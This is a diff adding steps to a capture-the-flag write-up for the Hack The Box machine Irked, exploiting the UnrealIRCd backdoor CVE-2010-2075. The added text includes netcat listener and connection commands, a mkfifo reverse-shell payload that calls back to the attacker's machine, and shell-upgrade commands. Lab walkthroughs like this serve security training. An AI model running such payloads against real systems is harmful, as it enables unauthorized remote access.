@@ -97,7 +97,36 @@ stty rows 55 columns 285
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6933e0b2-171c-4182-b635-9cf19572cdaf)
 
-+ CVE-2010-2075 [1-metasploit](https://www.exploit-db.com/exploits/16922) [2-manual](https://www.exploit-db.com/exploits/13853)
++ CVE-2010-2075 [1-metasploit](https://www.exploit-db.com/exploits/16922) , [2-manual](https://www.exploit-db.com/exploits/13853)
+
++ **Firstly**, click on [1-metasploit](https://www.exploit-db.com/exploits/16922) to see connection shape.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/19d728ce-af42-4718-b8f3-3ece0e9ec196)
+
++ **Secondly**, click on [2-manual](https://www.exploit-db.com/exploits/13853), and review it.
++ See payload options in the below:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7433fb58-b628-4b19-97b4-24e645f9a588)
+
++ Start netcat listener on the attack machine: `nc -lnvp 4444`
++ Connect to the target through the previous discovered vulnerable port **8067** with netcat on the attack machine's other terminal: `nc 10.10.10.117 8067`
++ Customize the payload to get a revershell specifying the ip and port number on the connected netcat connection of the target:
+```
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 4444 >/tmp/f
+```
+
++ Get the ircd's low level shell like in the above's [first method](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/16_Irked.md#method-1).
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b49d1763-6818-48b1-9c01-75fc4b5499ab)
+
++ In the same way, you can upgrade it to a better shell.
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+export TERM=xterm  
+export SHELL=bash
+```
 
 
 ## Privilege Escalation: from 'ircd' to 'djmardov'
